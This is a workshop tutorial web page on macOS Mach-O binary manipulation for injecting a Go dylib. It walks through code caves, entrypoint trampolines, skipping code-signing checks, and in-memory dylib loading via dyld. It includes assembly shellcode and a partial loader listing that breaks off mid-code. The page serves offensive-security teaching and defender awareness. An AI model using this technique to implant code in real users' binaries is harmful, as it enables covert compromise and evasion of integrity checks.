
<!doctype html>

<html>
<head>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
  <meta name="theme-color" content="#4F7DC9">
  <meta charset="UTF-8">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:site" content="@malwareunicorn">
  <meta name="twitter:creator" content="@malwareunicorn">
  <meta name="twitter:title" content="MacOS Dylib Injection through Mach-O Binary Manipulation">
  <meta name="twitter:description" content="This workshop will cover macOS Mach-O executable header parsing, compiling Go dylibs, entrypoint manipulation, shellcode, and dynamically loading dylibs into memory.">
  <meta name="twitter:image" content="https://malwareunicorn.org/macos_dylib_injection/img/afeeb630d3dafc87.png">
  <title>MacOS Dylib Injection through Mach-O Binary Manipulation</title>
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
  <link rel="stylesheet" href="../pkg/codelab-elements.css">
  <style>
    .success {
      color: #1e8e3e;
    }
    .error {
      color: red;
    }
  </style>
  <script src="../gif/webcomponentsjs/webcomponents-loader.js"></script>
</head>
<body>
  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
  <google-codelab codelab-gaid=""
                  id="macos_dylib_injection"
                  title="MacOS Dylib Injection through Mach-O Binary Manipulation"
                  environment="web"
                  feedback-link="">

      <google-codelab-step label="Introduction" duration="1">
        <p>This workshop is designed for those looking to develop offensive tooling or learning the technique for defense purposes. The content will cover developing stager code and shellcode for dynamic library injection in macOS environments (Mojave 10.14 &amp; Catalina 10.15) with Golang compiled binaries. The topics covered will include compiling Go dylibs, parsing Mach-O headers, binary code caves, binary entrypoint redirection, typical assembly routines used in shellcode, and understanding the Mach-O load order.</p>
<h2 is-upgraded>What you&#39;ll do</h2>
<p>You will be compiling Go libraries, assembly patching target Mach-O binaries, and loading a dylib into memory.</p>
<h2 class="checklist" is-upgraded>What you&#39;ll learn</h2>
<ul class="checklist">
<li>Compiling Go dylibs</li>
<li>Parsing Mach-O headers</li>
<li>Calculating a code cave</li>
<li>Designing an assembly trampoline for entrypoint manipulation</li>
<li>macOS specific assembly routines for shellcode</li>
<li>Mach-O load order</li>
<li>Dyld symbol resolution</li>
<li>Dylib loading from memory</li>
</ul>
<h2 is-upgraded>What you&#39;ll need</h2>
<ul>
<li>macOS environment (Mojave 10.14 or Catalina 10.15)</li>
<li>Latest Xcode</li>
<li>LLDB</li>
<li>Golang</li>
<li>Gcc</li>
<li>NASM</li>
<li>A basic disassembler (objdump works too)</li>
<li>Hex editor</li>
</ul>


      </google-codelab-step>

      <google-codelab-step label="Background" duration="0">
        <p>Since switching to an offensive role, I&#39;ve been designing implants for various environments. This workshop is a way to share knowledge with other offensive teams as well as defenders looking to instrument protections. The history of dylib loading technique was <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf" target="_blank">first notably mentioned in 2015</a> and has been used in the <a href="https://objective-see.com/blog/blog_0x51.html" target="_blank">wild in late 2019</a>. Since late 2019, I&#39;ve been able to implement this technique in shellcode. Below is an example of implementation.</p>
<p class="image-container"><img style="width: 610.00px" src="../macos_dylib_injection/img/afeeb630d3dafc87.png"></p>
<h3 is-upgraded>Terms</h3>
<p><strong>Mach-O</strong> - short for Mach Object file format, is a file format for executables, object code, shared libraries, dynamically-loaded code, and core dumps.</p>
<p><strong>dylib</strong> - macOS dynamically loaded shared library.</p>
<p><strong>dlyd</strong> - the dynamic linker.</p>
<p><strong>otool</strong> - object file displaying tool. The otool command displays specified parts of object files or libraries. </p>
<p><strong>nm</strong> -  command to list symbols from object files.</p>
<p><strong>header</strong> - contains general information about the binary: byte order (magic number), cpu type, amount of load commands, etc.</p>
<p><strong>load commands</strong> - kind of a table of contents, that describes position of segments, symbol table, dynamic symbol table, etc. Each load command includes meta-information, such as type of command, its name, position in a binary and so on.</p>
<p><strong>function prologue</strong> - a few lines of code at the beginning of a function, which prepares the stack and registers for use within the function.</p>
<p><strong>entrypoint</strong> - refers to the starting address within the code section that will be executed.</p>
<p><strong>bundle</strong> - is a macOS file directory with a defined structure and file extension, allowing related files to be grouped together as a conceptually single item.</p>
<p><strong>code cave </strong>- a section in memory or binary that is usually null bytes or bytes that can be overwritten with new bytes. Candidate code caves usually target bytes or code that is not vital to the normal operation of the target binary.</p>
<p><strong>shellcode</strong> - bytes of compiled code that contain position independent code. This means that it does not need any external resources in order to execute.</p>
<p><strong>trampoline</strong> - also known as an indirect jump vector, is a modification of fixed code to jump to a new location in code and then jump back to the original inline code execution.</p>


      </google-codelab-step>

      <google-codelab-step label="Compiling a Go dylib with C-Shared Build Mode" duration="0">
        <p>It&#39;s more common for malware to live off the land or use environment libraries during runtime because removing statically compiled dependencies reduces the size of the binary. However this is a binary that is being loaded into the memory of another process that needs to function as normal. Limiting need for external dependencies in the target environment lessens the chance of the dylib failing due to version incompatibility. Go provides that independence because it builds dependencies statically. When the dylib is loaded in memory,  you need to be able to execute a function based on a virtual address. Compiling Go as a c-shared library ensures that your function pointer address will execute properly because the function address is exported like a normal c-built library.</p>
<p>Set the build mode to &#34;c-shared&#34; and use external linker flags. You&#39; will need to include <code>import &#34;C&#34;</code> into the main Go file to ensure the Go binary compiles with cgo. This will create a c-like dylib binary. Here is an example:</p>
<pre><code>go build -o hello.dylib -buildmode=c-shared -ldflags &#34;-linkmode=external -w&#34; hello.go</code></pre>
<p><strong>Build options</strong></p>
<table>
<tr><td colspan="1" rowspan="1"><p><strong>Option</strong></p>
</td><td colspan="1" rowspan="1"><p><strong>Description</strong></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><code>-buildmode=c-shared</code></p>
</td><td colspan="1" rowspan="1"><p>Create a dynamic library so that C based programs can access the exports.</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><code>-linkmode=external</code></p>
</td><td colspan="1" rowspan="1"><p>Use the host clang or gcc linker. </p>
<p>From the Go doc: &#34;cmd/link does not process any host object files. Instead, it collects all the Go code and writes a single go.o object file containing it. Then it invokes the host linker (usually gcc) to combine the go.o object file and any supporting non-Go code into a final executable. External linking avoids the dynamic library requirement but introduces a requirement that the host linker be present to create such a binary.&#34;</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><code>-w</code></p>
</td><td colspan="1" rowspan="1"><p>Remove dwarf debug symbols</p>
</td></tr>
</table>
<h3 is-upgraded>Get the entrypoint address of an exported function</h3>
<p>Like all dynamically linked libraries, there are exported functions that can be called by the main thread. You want to ensure that you exported your target Go function. To export a function, be sure to capitalize the function name and comment it with the exported name (i.e. <code>//export FunctionName</code>).</p>
<pre><code>//export Test
Func Test(){
    fmt.Println(&#34;hello world&#34;)
}</code></pre>
<p>On macOS, the nm command can list the exported symbols of your Go binary. The address will be listed as hex.</p>
<pre><code>user@users-Mac Documents % nm -gU hello.dylib
000000000009b570 T _Test &lt;--
000000000009b970 T __cgo_get_context_function
000000000005bd50 T __cgo_panic
000000000009b5b0 T __cgo_release_context
000000000009b650 T __cgo_sys_thread_start
00000000000552a0 T __cgo_topofstack
000000000009b7e0 T __cgo_try_pthread_create
000000000009b880 T __cgo_wait_runtime_init_done
000000000009bf58 S __cgo_yield
000000000009b3f0 T __cgoexp_0ee63960fdf7_Test
000000000005bda0 T _crosscall2
000000000009ba80 T _crosscall_amd64
000000000009b9d0 T _x_cgo_callers
000000000009b5e0 T _x_cgo_init
000000000009b900 T _x_cgo_notify_runtime_init_done
000000000009b940 T _x_cgo_set_context_function
000000000009b9a0 T _x_cgo_setenv
000000000009b730 T _x_cgo_sys_thread_create
000000000009ba30 T _x_cgo_thread_start
000000000009b9c0 T _x_cgo_unsetenv</code></pre>
<p>Once you have the entrypoint address of the exported function, save it to use in the shellcode.</p>


      </google-codelab-step>

      <google-codelab-step label="Parsing the Mach-O Header" duration="0">
        <p>In order to place shellcode into a target Mach-O binary, you first need to collect:</p>
<ul>
<li>Entrypoint address</li>
<li>Offset to the end of the header</li>
<li>Offset to the beginning of the TEXT section</li>
<li>Offset to the end of the Mach-O binary</li>
</ul>
<p>Essentially you are using the space between the header section and the TEXT section as a code cave for the shellcode. Note that this particular code cave requires the shellcode size to fit. The technique of code caving is not a new concept. Entrypoint redirection is also a well known classic technique among other binary hijacking methods.</p>
<p class="image-container"><img style="width: 118.78px" src="../macos_dylib_injection/img/ec2cdd812d81d5ea.png"></p>
<h2 is-upgraded>Mach-O Header Breakdown</h2>
<p>The Mach-O header consists of basic metadata information and a table that contains a list of load commands. Following the header structure is the load commands section.</p>
<pre><code>struct mach_header_64 {
        uint32_t        magic;        /* mach magic number identifier */
        cpu_type_t        cputype;        /* cpu specifier */
        cpu_subtype_t        cpusubtype;/* machine specifier */
        uint32_t        filetype;        /* type of file */
--&gt;    uint32_t        ncmds;        /* number of load commands */
--&gt;    uint32_t        sizeofcmds;/* the size of all the load commands */
        uint32_t        flags;        /* flags */
        uint32_t        reserved;        /* reserved */
};</code></pre>
<p>https://opensource.apple.com/source/xnu/xnu-6153.11.26/EXTERNAL_HEADERS/mach-o/loader.h</p>
<p>The important piece of information in the header is the number of load commands (ncmds) and the size of all the load commands (sizeofcmds). The size of all load commands is the offset to the end of the full header which is the starting offset of the code cave.</p>
<h2 is-upgraded>Ignoring Code Signing Checks</h2>
<p>The size of commands will need to be manipulated in order to remove the code signing load command because once a binary is modified it will no longer pass the integrity check. Typically the code signing load command will be the last of the load commands. By decrementing the number of load commands, the dyld loader will ignore the code signing section altogether.</p>
<p>In order to get the entrypoint you need to traverse the list of load commands by using the cmdsize to find the next command struct offset. Load command LC_MAIN or LC_UNIXTHREAD will have the entrypoint needed. Most newer Mach-O binaries are compiled with LC_MAIN and older binaries use LC_UNIXTHREAD.</p>
<pre><code>struct load_command {
        uint32_t cmd;                /* type of load command */
        uint32_t cmdsize;        /* total size of command in bytes */
};</code></pre>
<p>https://opensource.apple.com/source/xnu/xnu-6153.11.26/EXTERNAL_HEADERS/mach-o/loader.h</p>
<p>The load command LC_MAIN will have the entrypoint in entryoff. Note that you can&#39;t always assume that entryoff is the beginning of the file offset of main().</p>
<pre><code>struct entry_point_command {
    uint32_t  cmd;        /* LC_MAIN only used in MH_EXECUTE filetypes */
    uint32_t  cmdsize;        /* 24 */
--&gt; uint64_t  entryoff;        /* file (__TEXT) offset of main() */
    uint64_t  stacksize;/* if not zero, initial stack size */
};</code></pre>
<p>For LC_UNIXTHREAD you will need to parse the registers to get the RIP register which contains the entrypoint.</p>
<pre><code>struct thread_command {
        uint32_t        cmd;                /* LC_THREAD or  LC_UNIXTHREAD */
        uint32_t        cmdsize;        /* total size of this command */
        /* uint32_t flavor                   flavor of thread state */
        /* uint32_t count                   count of longs in thread state */
--&gt;    /* struct XXX_thread_state state   thread state for this flavor */
        /* ... */
};

struct x86_thread_state64_t {
   uint64_t rax;
   uint64_t rbx;
   uint64_t rcx;
   uint64_t rdx;
   uint64_t rdi;
   uint64_t rsi;
   uint64_t rbp;
   uint64_t rsp;
   uint64_t r8;
   uint64_t r9;
   uint64_t r10;
   uint64_t r11;
   uint64_t r12;
   uint64_t r13;
   uint64_t r14;
   uint64_t r15;
--&gt;uint64_t rip;
   uint64_t rflags;
   uint64_t cs;
   uint64_t fs;
   uint64_t gs;
 };</code></pre>
<p>Next, you will need to get the offset of the TEXT section by traversing the load commands for LC_SEGMENT_64. The segment name (segname) should contain the word <code>__TEXT</code>.</p>
<pre><code>struct segment_command_64 { /* for 64-bit architectures */
        uint32_t        cmd;                /* LC_SEGMENT_64 */
        uint32_t        cmdsize;        /* includes sizeof section_64 structs */
--&gt;    char                segname[16];        /* segment name */
        uint64_t        vmaddr;                /* memory address of this segment */
        uint64_t        vmsize;                /* memory size of this segment */
        uint64_t        fileoff;        /* file offset of this segment */
        uint64_t        filesize;        /* amount to map from the file */
        vm_prot_t        maxprot;        /* maximum VM protection */
        vm_prot_t        initprot;        /* initial VM protection */
        uint32_t        nsects;                /* number of sections in segment */
        uint32_t        flags;                /* flags */
};</code></pre>
<p>This command is followed by a list of segments. You need to traverse the list of segments to find the section name (sectname) <code>__text</code>. The address (addr) will contain the virtual memory address of the start of the TEXT section which is the start of the code.</p>
<pre><code>struct section_64 { /* for 64-bit architectures */
--&gt;    char                sectname[16];/* name of this section */
        char                segname[16];/* segment this section goes in */
--&gt;    uint64_t        addr;                /* memory address of this section */
        uint64_t        size;                /* size in bytes of this section */
        uint32_t        offset;        /* file offset of this section */
        uint32_t        align;        /* section alignment (power of 2) */
        uint32_t        reloff;        /* file offset of relocation entries */
        uint32_t        nreloc;        /* number of relocation entries */
        uint32_t        flags;        /* flags (section type and attributes)*/
        uint32_t        reserved1;        /* reserved (for offset or index) */
        uint32_t        reserved2;        /* reserved (for count or sizeof) */
        uint32_t        reserved3;        /* reserved */
};</code></pre>
<p>Now that you have the virtual address of the entrypoint and the file offset of the entrypoint, you can use these to create the trampoline needed for the shellcode. You also have the offsets for the beginning and end of the code cave for the shellcode. You will place your shellcode within the code cave with a 16 byte boundary. To reiterate here is a list of addresses you have at this point:</p>
<ul>
<li>Virtual address of the entrypoint</li>
<li>File offset of the start of TEXT</li>
<li>File offset of the end of the Load Commands</li>
<li>The Number of Load Commands</li>
<li>Entrypoint of the shellcode</li>
</ul>


      </google-codelab-step>

      <google-codelab-step label="Entrypoint Redirection" duration="0">
        <h2 is-upgraded>Creating the Entrypoint Trampoline</h2>
<p class="image-container"><img style="width: 197.29px" src="../macos_dylib_injection/img/bff88b23346be80e.png"></p>
<p>Compiled functions usually have a predictable function prologue that sets up the stack pointer, allocates stack space for the function, and stores register values. Typically these prologues are similar if compiled by the same native compiler. Below is an example of 2 different Mach-O binaries with the same function prologue. You can dump this assembly using a basic disassembler.</p>
<p><em>Google Chrome Helper function prologue</em></p>
<pre><code>_main:
100001340:      55      pushq   %rbp
100001341:      48 89 e5        movq    %rsp, %rbp
100001344:      41 57   pushq   %r15
100001346:      41 56   pushq   %r14
100001348:      41 55   pushq   %r13
10000134a:      41 54   pushq   %r12
10000134c:      53      pushq   %rbx</code></pre>
<p><em>Calculator function prologue</em></p>
<pre><code>_main:
100001340:      55      pushq   %rbp
100001341:      48 89 e5        movq    %rsp, %rbp
100001344:      41 57   pushq   %r15
100001346:      41 56   pushq   %r14
100001348:      41 55   pushq   %r13
10000134a:      41 54   pushq   %r12
10000134c:      53      pushq   %rbx</code></pre>
<p>Now you need to know the offset to the start of your shellcode in the code cave. You will need to calculate the relative jump offset from the entrypoint + size of jump instruction. This should be a negative number which will be used in the jmp assembly instruction.</p>
<pre><code>int32 relative_jump_offset = shellcode_entrypoint-(entrypoint+size_of_jmp_instr);</code></pre>
<p>Using a hex editor, overwrite the original function prologue with a relative jump instruction. This will take up 5 bytes. Pad the remaining bytes with a nop. Be sure to save the instructions that were overwritten, at the end of your shellcode you will need to recreate those instructions before jumping back to continue the original function prologue. </p>
<aside class="special"><p><strong>Note:</strong> It&#39;s important to preserve the function prologue and the stack so that the original program remains stable. There are many values passed to the main function by the Mach-O loader. If you are using local variables on the stack be sure to allocate enough stack space for all your variables and restore the stack pointer.</p>
</aside>
<p><em>Entrypoint of main with trampoline</em></p>
<pre><code>_main:
100001340:      e9 bb fa ff ff  jmp     -1349
100001345:      90      nop
100001346:      41 56   pushq   %r14
100001348:      41 55   pushq   %r13
10000134a:      41 54   pushq   %r12
10000134c:      53      pushq   %rbx</code></pre>
<p><em>End of shellcode restoring prologue</em></p>
<pre><code>100000FD7 48 89 E5        mov     rbp, rsp
100000FDA 41 57           push    r15
100000FDC E9 65 03 00 00  jmp    0x36a ; loc_100001346</code></pre>
<h2 is-upgraded>Process Fork/Execve &amp; Memory</h2>
<p>In macOS, when a process is forked the child process does not get an exact duplicate of the memory space. So if you were to load the dylib in memory in the parent process and then fork, the child process will not be able to access the dylib you loaded. Ultimately you want to redirect the control flow to the dylib without disrupting the original control flow so you will need to choose which child or parent process is going to load the dylib.</p>
<p>By calling execve on a copy of the parent process, this will ensure that the original process performs it&#39;s original functionality without disrupting the memory space. As for this case, the main arguments were verified in order to continue to the dylib loading.</p>
<p><em>Example of fork/execve the child process</em></p>
<pre><code> ; check the arguments
  cmp    rdi, 2                ; if argc == 2
  jne    .parentprocess
  mov    rax, [rsi+8]          ; get argv[1]
  mov    eax, dword [rax]
  cmp    eax, 0x00303031       ; if argv[1] == &#34;100&#34;
  jne    .exit
  jmp    .childprocess
.parentprocess:
  ; Do fork
  mov    rax, 0x2000002        ; int fork(void)
  syscall
  cmp    edx, 0                ; if child continue
  jz    .exit                  ; if parent return to original code
  ; Do exec
  mov    qword [rsp+0x28], 0x00303031
  mov    qword [rsp+0x10], 0   ; argv[2]=NULL
  lea    rax, [rsp+0x28]
  mov    [rsp+0x8], rax        ; argv[1]=&#34;100&#34;
  lea    rax, [rel targetName]
  mov    [rsp+0], rax          ; argv[0]
  mov    rsi, rsp              ; argv
  lea    rdi, [rel targetName] ; Arg1
  xor    rdx, rdx
  mov    rax, 0x200003b        ; execve
  syscall</code></pre>
<h2 is-upgraded>How to catch a forked process with LLDB</h2>
<p>LLDB doesn&#39;t provide an option to follow forked processes like GDB&#39;s follow-fork-mode. Instead you will need to wait and attach to the process after the fork system call is made. In 2 instances of LLDB, the first will be stopped at a breakpoint before the system call to fork and the second instance will be the following command that waits to attach to the forked process. Single step the system call and it will attach in the second instance.</p>
<pre><code>(lldb) process attach --name a.out --waitfor</code></pre>


      </google-codelab-step>

      <google-codelab-step label="Loading the Dylib in Memory" duration="0">
        <p>For those who are familiar with Windows OS, /usr/lib/dyld is a binary similar to ntdll in that it handles the loading of a Mach-O image into memory and accesses process addresses.</p>
<h2 is-upgraded>Mach-O Load Order</h2>
<p>The dyld linker uses a specific order to load dylib dependencies in the memory stack. First the main executable image will be loaded and then the dyld linker. These offsets are determined by the XNU kernel. </p>
<p>The dyld will be offsetted from the main executable in a range between 0x1000-0xFFFF000 and is a multiple of 0x1000. Typically in Mojave and Catalina, the dyld_shared_cache is enabled by default. All other linked system dylibs will use the dyld shared-cache to populate the virtual memory address offset by a slide (padding buffer between dylibs). Unlike the way the main executable and dyld were loaded into memory, these system dylibs will just be linked by the dyld instead of loaded.</p>
<p><em>Code snippet of how the dyld aslr offset is calculated</em></p>
<pre><code>dyld_aslr_page_offset = random();
dyld_aslr_page_offset %= vm_map_get_max_loader_aslr_slide_pages(map);
dyld_aslr_page_offset &lt;&lt;= vm_map_page_shift(map);</code></pre>
<p>https://github.com/apple/darwin-xnu/blob/master/bsd/kern/mach_loader.c</p>
<p>Using LLDB, you can view the dyld in the image list with the command <code>(lldb) image list</code>.</p>
<p><em>Example of dyld in the image list</em></p>
<pre><code>[  0] 0x0000000100000000 /Users/user/Documents/originalmacho
[  1] 0x0000000100047000 /usr/lib/dyld &lt;--
[  2] 0x00007fff70ab5000 /usr/lib/libsandbox.1.dylib
[  3] 0x00007fff6eb5b000 /usr/lib/libSystem.B.dylib
[  4] 0x00007fff3a995000 /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation </code></pre>
<p>Compared to Windows, there is no Process Environment Block (PEB) equivalent in macOS. The address to dyld can be searched by starting from the initial address of the main executable + executable size. Since the dyld will always exist at a multiple of 0x1000, the Mach-O file header 0xfeedfacf can be scanned by checking each offset. In order to avoid access violations, you can use the syscall chmod to test if an address is a valid pointer.</p>
<p><em>Checking with chmod before dereferencing a pointer</em></p>
<pre><code>; chmod check
.fmcheck:                 ; else
  mov rdi, rbx            ; Arg1: check is address is valid
.fmderef:
  mov rsi, 0777o          ; Arg2: mode
  mov rax, 0x200000F      ; int chmod(user_addr_t path, int mode)
  syscall
  xor rsi, rsi            ; clear rsi
  cmp rax, 2              ; check error is ENOENT</code></pre>
<h2 is-upgraded>Resolve the necessary symbols</h2>
<p>The address to dyld is necessary to resolve functions needed to load the malicious dylib into memory. Every version of macOS will have a different /usr/lib/dyld binary so you will need to dynamically look up the offsets in the symbol table. In the Mach-O&#39;s header, the LC_SYMTAB command contains the metadata of the symbol table.</p>
<pre><code>struct symtab_command {
        uint32_t        cmd;                /* LC_SYMTAB */
        uint32_t        cmdsize;        /* sizeof(struct symtab_command) */
--&gt;    uint32_t        symoff;        /* symbol table offset */
        uint32_t        nsyms;        /* number of symbol table entries */
--&gt;    uint32_t        stroff;        /* string table offset */
        uint32_t        strsize;        /* string table size in bytes */
};</code></pre>
<p>https://opensource.apple.com/source/xnu/xnu-6153.11.26/EXTERNAL_HEADERS/mach-o/loader.h</p>
<p>In the Mach-O&#39;s header, the LC_SEGMENT_64 command contains the virtual addresses for LINKEDIT and TEXT. These virtual address offsets (vmaddr) and file offset (fileoff) are needed to calculate the offset to the symbol code.</p>
<pre><code>struct segment_command_64 {        /* for 64-bit architectures */
        uint32_t        cmd;                /* LC_SEGMENT_64 */
        uint32_t        cmdsize;        /* includes sizeof section_64 structs */
        char                segname[16];        /* segment name */
--&gt;    uint64_t        vmaddr;                /* memory address of this segment */
        uint64_t        vmsize;                /* memory size of this segment */
--&gt;    uint64_t        fileoff;        /* file offset of this segment */
        uint64_t        filesize;        /* amount to map from the file */
        vm_prot_t        maxprot;        /* maximum VM protection */
        vm_prot_t        initprot;        /* initial VM protection */
        uint32_t        nsects;                /* number of sections in segment */
        uint32_t        flags;                /* flags */
};</code></pre>
<p>https://opensource.apple.com/source/xnu/xnu-6153.11.26/EXTERNAL_HEADERS/mach-o/loader.h</p>
<p>You will need to traverse the symbol table to collect the nlist. The nlist will contain the offset of the symbol name in the symbol string table.</p>
<pre><code>struct nlist_64 {
        union {
                uint32_t n_strx;/* index into the string table */
        } n_un;
        uint8_t n_type;        /* type flag, see below */
        uint8_t n_sect;        /* section number or NO_SECT */
        uint16_t n_desc;        /* see &lt;mach-o/stab.h&gt; */
--&gt;    uint64_t n_value;        /* value of this symbol (or stab offset) */
};</code></pre>
<p>https://opensource.apple.com/source/xnu/xnu-6153.11.26/EXTERNAL_HEADERS/mach-o/nlist.h</p>
<p><em>Traversing the nlist to get the virtual address of a symbol pseudocode</em></p>
<pre><code>uint32 target_symbol = 0x4d6d6f72;
unint64 file_slide = linkedit-&gt;vmaddr-text-&gt;vmaddr-linkedit-&gt;fileoff;
char* strtab = (char *)(base_addr + file_slide + symtab-&gt;stroff);
struct nlist_64 *nlist = (struct nlist_64 *)(base_addr + file_slide + symtab-&gt;symoff);
for (int i = 0; i &lt; symtab-&gt;nsyms; i++){
    uint32 name = strtab + nlist[i].n_un.n_strx
    if (name == target_symbol)
        return base_addr + nlist[i].n_value;
}</code></pre>
<h2 is-upgraded>NSCreateObjectFileImageFromMemory and NSLinkModule</h2>
<p>There are 2 dyld functions that link dylibs from memory:</p>
<ul>
<li>NSCreateObjectFileImageFromMemory which performs the typical dyld loading procedure for an object that exists in a memory location rather than a file. </li>
<li>NSLinkModule which adds the loaded dylib image memory space to the current process&#39; image list array.</li>
</ul>
<p>The discovery of these functions used for in-memory runtime loading was originally mentioned in the Blackhat 2015 talk &#34;<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf" target="_blank">Writing Bad @$$ Malware for OS X</a>&#34; by Patrick Wardle.</p>
<pre><code>NSObjectFileImageReturnCode NSCreateObjectFileImageFromMemory(const void* address, size_t size, NSObjectFileImage *objectFileImage)

NSModule NSLinkModule(NSObjectFileImage objectFileImage, const char* moduleName, uint32_t options)</code></pre>
<p>https://github.com/opensource-apple/dyld/blob/master/src/dyldAPIs.cpp</p>
<p>The malicious dylib must already exist somewhere in memory, so first use the mmap syscall to load your dylib into memory. Next you can pass that address to NSCreateObjectFileImageFromMemory to initialize the image. This function requires the dylib type to be a bundle so you will need to change the type in the dylib&#39;s Mach-O header. </p>
<p><em>Shellcode calling each function</em></p>
<pre><code>; create file image
  lea    rsi, [rel targetSize]  ; Arg2: size
  mov    rsi, [rsi]
  lea    rdx, [rsp+0x90]        ; Arg3: NSObjectFileImage &amp;fi
  mov    rax, [rsp+0x80]
  call   rax                    ; _NSCreateObjectFileImageFromMemory
  test   al, al
  jz     .leaveall
; link image
  mov    rdi, [rsp+0x90]        ; Arg1: NSObjectFileImage fi
  lea    rsi, [rel payloadName] ; Arg2: image name
  mov    edx, 3                 ; Arg3: NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW
  mov    rax, [rsp+0x88]
  call   rax                    ; _NSLinkModule
  mov    [rsp+0x98], rax        ; NSModule nm</code></pre>
<p>Next, call NSLinkModule to link the image to the image list of the main executable. This function will return a pointer to NSModule. You will need to traverse addresses (size 8) from this pointer in order to acquire the address to the newly linked malicious dylib. This process is similar to finding the dyld image except you are dereferencing the pointer.</p>
<p><em>Example of &#34;evil&#34; dylib loaded and linked in the image list</em></p>
<pre><code>[ 38] 0x00007fff71f32000 /usr/lib/system/libsystem_trace.dylib
[ 39] 0x00007fff71f4a000 /usr/lib/system/libunwind.dylib
[ 40] 0x00007fff71f50000 /usr/lib/system/libxpc.dylib
[ 41] 0x00007fff7099b000 /usr/lib/libobjc.A.dylib
[ 42] 0x00007fff6ee8d000 /usr/lib/libc++abi.dylib
[ 43] 0x00007fff6ee39000 /usr/lib/libc++.1.dylib
[ 44] 0x00007fff6f902000 /usr/lib/libfakelink.dylib
[ 45] 0x00007fff6e693000 /usr/lib/libDiagnosticMessagesClient.dylib
[ 46] 0x00007fff6fa14000 /usr/lib/libicucore.A.dylib
[ 47] 0x00007fff71073000 /usr/lib/libz.1.dylib
[ 48] 0x0000000106a50000 evil (0x0000000106a50000) &lt;--</code></pre>
<p>Once you have the base address of your newly linked dylib, you can add it to the function offset of the exported function to call the exported function.</p>
<pre><code>  mov    rdx, [rdx]
  add    rsi, rdx         ; dylib image base address + export offset
  call   rsi              ; call payload function</code></pre>
<p>At this point, you have the dylib loaded in memory and the exported function called. If your forked child process is crashing, this means there is something wrong with the dependencies or insufficient error handling in the dylib you loaded. Keep in mind that any crashes will be reported in system logging and you might need to spin up LLDB to debug break on the crash.</p>
<p>I hope you enjoyed this workshop and hopefully you will feel more comfortable working with shellcode on macOS.</p>


      </google-codelab-step>

      <google-codelab-step label="Appendix" duration="0">
        <h3 is-upgraded>Shellcode</h3>
<pre><code>; shellcodeloader.asm
; written by malwareunicorn
; WARNING: FOR MACOS ONLY
; nasm -f macho64 shellcodeloader.asm -o shellcodeloader.o &amp;&amp; ld -o shellcodeloader.macho -macosx_version_min 10.14 -lSystem -e main shellcodeloader.o

; Description: This is meant to be initial shellcode in a target process.
; The shellcode expects a macos dylib to be at the targetOffset. It will then
; load the dylib as an mmapped file. Then it will find the base address of dyld
; to get the 2 API calls needed to load the dylib image. Once the dylib is
; loaded it will get the targetEntry to call the export function of the dylib.

BITS 64

section .text
global main

main:
  ; fix registers and stack
  push   rbp
  mov    rbp, rsp
  sub    rsp, 0xB0

  ; check the arguments
  cmp    rdi, 2           ; if argc == 2
  jne    .parentprocess
  mov    rax, [rsi+8]     ; get argv[1]
  mov    eax, dword [rax]
  cmp    eax, 0x00303031  ; if argv[1] == &#34;100&#34;
  jne    .exit
  jmp    .childprocess
.parentprocess:
  ; Do fork
  mov    rax, 0x2000002   ; int fork(void); vfork 0x42
  syscall
  cmp    edx, 0           ; if child continue
  jz    .exit             ; if parent return to original code

  ; Do exec
  mov    qword [rsp+0x28], 0x00303031
  mov    qword [rsp+0x10], 0   ; argv[2]=NULL
  lea    rax, [rsp+0x28]
  mov    [rsp+0x8], rax        ; argv[1]=&#34;100&#34;
  lea    rax, [rel targetName]
  mov    [rsp+0], rax          ; argv[0]
  mov    rsi, rsp              ; argv
  lea    rdi, [rel targetName] ; Arg1:
  xor    rdx, rdx
  mov    rax, 0x200003b   ; execve
  syscall
  jmp    .leaveall
.childprocess:
  lea    rdi, [rel targetName] ; Arg1: Target Macho Name
  mov    rsi, 0x2         ; Arg2: O_RDWR flag
  mov    rax, 0x2000005   ; int open(user_addr_t path, int flags, int mode) NO_SYSCALL_STUB; }
  syscall
  cmp    rax, 3           ; if fd &lt; 3
  jl     .leaveall
  mov    [rsp+0x68], rax  ; store the fd
  lea    r9, [rel targetOffset] ; Arg6: offset of stage3 should be a multiple of the page size
  mov    r9, [r9]         ; offset
  mov    r8, rax          ; Arg5: fd
  mov    rcx, 0x1002      ; Arg4: flags MAP_ANON | MAP_PRIVATE
  mov    rdx, 0x7         ; Arg3: PROT_READ | PROT_WRITE | PROT_EXEC
  lea    rsi, [rel targetSize]  ; Arg2: filesize multiple of the page size of the system
  mov    rsi, [rsi]
  mov    rdi, 0           ; Arg1: return address
  mov    rax, 0x20000C5   ; user_addr_t mmap(caddr_t addr, size_t len, int prot, int flags, int fd, off_t pos)
  syscall
  cmp    rax, 0x7F        ; if error code
  jl     .leaveall

  ; Store address of golang binary
  mov    [rsp+0x70], rax
  xor    rcx, rcx         ; Arg4: no deref
  mov    rdx, 0x1000      ; Arg3: increment
  xor    rsi, rsi         ; Arg2: &amp;base
  mov    rdi, 0x100000000 ; Arg1: EXECUTABLE_BASE_ADDR
  call   .findmacho
  xor    rcx, rcx         ; Arg4: no deref
  mov    rdx, 0x1000      ; Arg3: increment as 0x1000
  add    rsi, 0x44000     ; approx size of Target Macho
  mov    rdi, rsi         ; Arg1: EXECUTABLE_BASE_ADDR + 0x44000
  xor    rsi, rsi         ; Arg2: &amp;dyld
  call   .findmacho
  mov    [rsp+0x78], rsi  ; store binary base address of dyld

  ; get symbols:
  mov    rdx, [rsp+0x78]  ; Arg3: binary base address of dyld
  mov    rsi, 25          ; Arg2: offset
  mov    rdi, 0x4d6d6f72  ; Arg1: _NSCreateObjectFileImageFromMemory
